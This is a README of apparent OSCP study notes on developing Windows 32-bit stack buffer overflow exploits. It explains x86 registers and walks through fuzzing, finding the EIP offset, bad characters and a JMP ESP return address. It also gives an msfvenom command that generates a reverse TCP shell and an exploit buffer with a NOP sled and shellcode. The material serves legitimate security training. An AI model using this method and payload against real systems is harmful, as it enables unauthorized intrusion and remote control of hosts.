# Win32-Buffer-Overflow
 Notes and scripts for a basic windows 32-bit buffer overflow exploit development. Aimed for OSCP preparation.

## Contents

[Introduction](#Introduction)

[TL;DR](README.md#TLDR)

[Global Steps](README.md#Global-Steps)

[Methodology](README.md#Methodology)

# Introduction

## First some basics!

**Some basic understanding of buffer overflow can be found [here](https://www.youtube.com/watch?v=1S0aBV-Waeo).**

The x86 architecture does contain 8 general registers that are used to store data and then can address that point to other positions in the memory.

* EBP (base pointer)
* ESP (stack pointer)
* EAX (accumulator)
* EBX (base)
* ECX (counter)
* EDX (data)
* EDI (destination index)
* ESI (source index)

**EIP**: Extended Instruction Pointer. This is a read-only register and does contain the address of the next instruction to be executed (tells the CPU what to do next).

**ESP**: Extended Stack Pointer. Points to the top of the stack (at any time) at the lower memory location.

**EBP**: Extended Base Stack Pointer. Points to higher address (last item) at the bottom of the stack.

**JMP**: In the x86 assembly language, the JMP instruction performs an unconditional jump. Such an instruction transfers the flow of execution by changing the instruction pointer register. 

This should give a good idea about "what" and "why" of **JMP-ESP** [here](https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack). The OPCODE for JMP ESP is \xff\xe4 (in assembly). 
* * *


# TLDR

**Steps:**
- [ ] Find offset
- [ ] Ensure control over EIP at found offset (4 B’s)
- [ ] Find bad characters
- [ ] Find return address (JMP ESP)
- [ ] Ensure EIP overwrite (Breakpoint - F2 - at return address )
- [ ] Ensure buffer length for shellcode is good enough
- [ ] Get a shell

# Global-Steps

*Note: These steps are a reminder of the global Windows buffer overflow and are not intended to be a manual :)*

**Step 1**: fuzz till crash and note EIP is overwritten by A's (x41).

**Step 2**: use pattern_create.rb to generate unique string and send it to target
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`

**Step 3**: identify 4 bytes that overwrite EIP (this is in HEX)

**Step 4**: use pattern_offset.rb to calculate the offset of these specific 4 bytes
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438`

**Step 5**: send new buffer string to check if we can control the EIP register, since it should be written over with B's. Add to exploit and notice the result of the ESP and EIP registers:
`buffer = "A" * 2606 + "B" * 4 + "C" * 90`

**Step 6**: check if more space within buffer is available (increase buffer length from 2700 to 3500 bytes and see if this results in a larger buffer space for our shellcode). Fire up “morespace.py” -> right click ESP -> follow in dump. Add to exploit and check for C's:
`buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)`

**Step 7**: check for bad chars (0x00 to 0xff). Paste all these chars within buffer and check where ESP register dump is truncated (p. 161). Right click ESP and follow in dump to see.
`Notice skipped chars!`

**Step 8**: if we can't jump directly to our buffer, we need to find a reliable address in memory that contains an instruction such as JMP ESP. We could jump to it, and in turn end up at the address pointed to, by the ESP register, at the time of the jump. This would be a reliable indirect way to reacht the memory indicated by ESP register. mona.py can help identify modules in memory that we can search for return address (no DEP and ASLR should be present and high memory range that doesn't contain bad chars)
`!mona modules`
*Check if not being affected by any memory protection schemes (Rebase, SafeSEH, ASLR, NXCompat) and note the specific DLL (right column).*

**Step 9**: JMP ESP equivalent = opcode.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
```
*Note result as: "\xff\xe4"*

**Step 10**: use mona to find the JMP ESP memory address within the DLL found in step 8. Use one which does not contain any bad chars.
`!mona find -s "\xff\xe4" -m <dllname>.dll`

**Step 11**: pause Immunity Debugger and follow the address (black arrow pointing to right: "Expression to follow"). Note if the JMP ESP is found (pane left above).

**Step 12**: set a breakpoint to check if we can reach the JMP ESP.
*left upper pane -> right click -> go to expression
left upper pane -> right click -> breakpoint -> toggle (F2)
play and do the following:
Add to PoC (the memory address is the one we found in step 10, noted Little Endian):*
`buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390`
*Run PoC and check if breakpoint is hit (message at the bottom of Immunity Debugger).*

**Step 13**: generate reverse shell
`msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`

**Step 14**: add the reverse shell code to the exploit and change to:
`buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode`
*Increase NOP slide if needed*

* * *

# Methodology

[1. Connection](1_Connection.md)

[2. Fuzzing](2_Fuzzing.md)

[3. Getting Offset](3_Getting-Offset.md)

[4. Controlling EIP](4_Controlling-EIP.md)

[5. Badcharacters](5_Badchars.md)

[6. Finding JMP Pointer](6_Finding-JMP-Pointer.md)

[7. JMP ESP](7_JMP-ESP.md)

[8. Obtaining a Shell](8_Shell.md)

* * *

